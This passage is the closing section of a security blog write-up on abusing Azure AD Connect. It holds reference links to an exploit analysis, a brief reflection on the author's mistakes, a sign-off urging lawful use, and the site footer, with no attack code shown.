<li><a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">https://blog.xpnsec.com/azuread-connect-for-redteam/</a></li>
</ul>
</li>
<li>Honestly so much about the AD Connect service. I have done a more thorough writeup and have actually broken down <code>xpn</code>&rsquo;s exploit in this post:
<ul>
<li><a href="https://bloodstiller.com/articles/azureadconnect/">https://bloodstiller.com/articles/azureadconnect/</a></li>
</ul>
</li>
</ol>
<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
<ol>
<li>Not too bad this time, it was more about just getting my head around Azure AD Connect and understanding XPN&rsquo;s script took me the longest</li>
</ol>
<h2 id="sign-off">Sign off:</h2>
<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
<p>Until next time, hack the planet!</p>
<p>‚Äì Bloodstiller</p>
<p>‚Äì Get in touch bloodstiller at proton dot me</p>

            
        </div>
    </article>

        </main>

        <footer class="footer">
    <div class="footer-left">
        <ul class="social">
            
                <li>All Rights Reserved ¬Æ.</li>
            

            
                <li>Bloodstiller</li>
            

            
                
            
                
            
                
                    <li>
                        
                            <a href="https://github.com/bloodstiller" target="_blank">
                                <i class="bi-github"></i>
                            </a>
                        

                    </li>
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
        </ul>
    </div>

    <div class="footer-right">
        <ul class="control status clearfix">
            
                <li>
                    
                        Word Count:
                        2983
                    
                </li>
            

            
            

            
                <li>en</li>
            

            
                <li>
                    <a href="https://gohugo.io" class="btn" target="_blank"
                        >Hugo: 0.135.0</a
                    >
                </li>
            

            
                <li>
                    <a
                        href="https://github.com/JingWangTW/dark-theme-editor"
                        class="btn"
                        target="_blank"
                        >Theme: dark-theme-editor</a
                    >
                </li>
            

            
                <li>
                    
                        Last modified: &nbsp;
                        <time>
                            Oct 14 2024 00:00:00
                        </time>
                    
                </li>
            

            
                <li title="">
                    
                </li>
            
        </ul>
    </div>
</footer>

    </body>

    






















    
        
        <script
            type="text/javascript"
            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
    















<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />




</html>
